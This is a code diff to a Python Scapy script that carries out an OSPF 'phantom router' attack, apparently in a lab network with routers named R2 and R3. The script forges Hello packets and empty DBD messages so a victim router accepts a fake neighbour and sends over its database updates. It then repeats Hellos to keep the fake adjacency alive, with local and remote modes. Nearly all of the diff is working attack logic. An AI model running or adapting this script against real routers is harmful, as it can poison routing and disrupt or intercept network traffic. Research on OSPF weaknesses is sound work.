@@ -21,16 +21,23 @@ DESTINATION_ADDRESS = '10.0.1.2'
 HELLO_DESTINATION_MAC_ADDRESS = '01:00:5e:00:00:05'
 HELLO_DESTINATION_ADDRESS = '224.0.0.5'
 
+ATTACK_DBD_MESSAGES = 10
+ATTACK_DBD_INTERVAL = 2
+ATTACK_HELLO_INTERVAL = 39
+
+
 HELLO_INTERVAL = 10
 DEAD_INTERVAL = 40
 TTL = 64 # set to a value greater than 1 in order to be forwarded towards the victim router
-
-OUTPUT_INTERFACE = 'atk1-eth0'
 
 eight_bit_space = [1L, 2L, 4L, 8L, 16L, 32L, 64L, 128L]
 
 
 def send_hello_packet(iface, srcMAC, dstMAC, srcIP, dstIP):
+	print 'send_hello_packet'
+	print dstIP
+	print '--------------------'
+
 	eth_header = Ether(src=srcMAC, dst=dstMAC)
 
 	ttl = None
@@ -95,66 +102,57 @@ def send_empty_dbd_messages(iface, srcMAC, dstMAC, srcIP, dstIP, n, interval):
 
 
 def send_hello_packets(iface, srcMAC, dstMAC, srcIP, dstIP, interval):
-	eth_header = Ether(src=srcMAC, dst=dstMAC)
-
-	ip_header = IP(src=srcIP, dst=dstIP, ttl=TTL, proto=89)
-
-	ospf_header = OSPF_Hdr(\
-		src='2.2.2.3')
-
-	ospf_payload = OSPF_Hello(\
-		hellointerval=HELLO_INTERVAL, \
-		deadinterval=DEAD_INTERVAL,\
-		mask='0.0.0.0',\
-		neighbors=['2.2.2.2', '1.1.1.1'],\
-		#router='10.0.1.3',\
-		#backup='10.0.1.2',\
-		options=2L)
-
-	frame = eth_header/ip_header/ospf_header/ospf_payload
-	frame.show()	
-
-	i = 0
+	i = 1
 
 	while True:
-		log('sending %d-th hello message' % i+1, 'red')
+		log('sending hello message %s' % i, 'red')
 
 		sleep(interval)
 
 		send_hello_packet(iface, srcMAC, dstMAC, srcIP, dstIP)
 
+		i = i + 1
+
 
 def main():
-	iface = sys.argv[1]
-	src_mac_address = sys.argv[2]
-	dst_mac_address = sys.argv[3]
+	remote_flag = int(sys.argv[1])
+	iface = sys.argv[2]
+	src_mac_address = sys.argv[3]
+	dst_mac_address = sys.argv[4]
 
+	assert remote_flag is not None
 	assert iface is not None
 	assert src_mac_address is not None
 	assert dst_mac_address is not None
 
 	print
+	if remote_flag != 1:
+		print 'performing a local attack'
+	else:
+		print 'performing a remote attack'
 	print 'interface', iface
 	print 'source MAC address', src_mac_address
 	print 'destination MAC address', dst_mac_address
 
-	# FIXME
-	# R3 does not forward Hello packet
+	# first hello message to let victim know about the phantom router
+	if remote_flag != 1:
+		send_hello_packet(iface, src_mac_address, HELLO_DESTINATION_MAC_ADDRESS, SOURCE_ADDRESS, HELLO_DESTINATION_ADDRESS)
+	else:
+		send_hello_packet(iface, src_mac_address, dst_mac_address, SOURCE_ADDRESS, DESTINATION_ADDRESS)
 
-	# test1
-	#send_hello_packet(OUTPUT_INTERFACE, src_mac_address, dst_mac_address, SOURCE_ADDRESS, DESTINATION_ADDRESS)
+	# empty dbd messages to let the victime send over the network its dbd updates
+	send_empty_dbd_messages(iface, src_mac_address, dst_mac_address, SOURCE_ADDRESS, DESTINATION_ADDRESS, ATTACK_DBD_MESSAGES, ATTACK_DBD_INTERVAL)
 
-	# test2
-	# HELLO_DESTINATION_ADDRESS => TTL != 1 for a packet sent to the Local Network Control Block
-	send_hello_packet(iface, src_mac_address, HELLO_DESTINATION_MAC_ADDRESS, SOURCE_ADDRESS, HELLO_DESTINATION_ADDRESS)
+	# hello pakets to persist the presence of the phantom router
+	if remote_flag != 1:
+		send_hello_packets(iface, src_mac_address, HELLO_DESTINATION_MAC_ADDRESS, SOURCE_ADDRESS, DESTINATION_ADDRESS, ATTACK_HELLO_INTERVAL)
+	else:
+		send_hello_packets(iface, src_mac_address, HELLO_DESTINATION_MAC_ADDRESS, SOURCE_ADDRESS, DESTINATION_ADDRESS, ATTACK_HELLO_INTERVAL)
 
-	send_empty_dbd_messages(iface, src_mac_address, dst_mac_address, SOURCE_ADDRESS, DESTINATION_ADDRESS, 10, 2)
-
-	# TODO implement properly following messages
-	send_hello_packets(iface, src_mac_address, dst_mac_address, SOURCE_ADDRESS, DESTINATION_ADDRESS, 39)
-
-	log('attack terminated', 'red')
-
+	# TODO R3 non fa il forwarding se REMOTE_ATTACK = 1
+	# prova a fare un ping e 
+	# confronta il pacchetto ICMP in andata da ratk a R2
+	# con i pacchetti dell'attacco sempre da ratk a R2
 
 if __name__ == "__main__":
 	main()
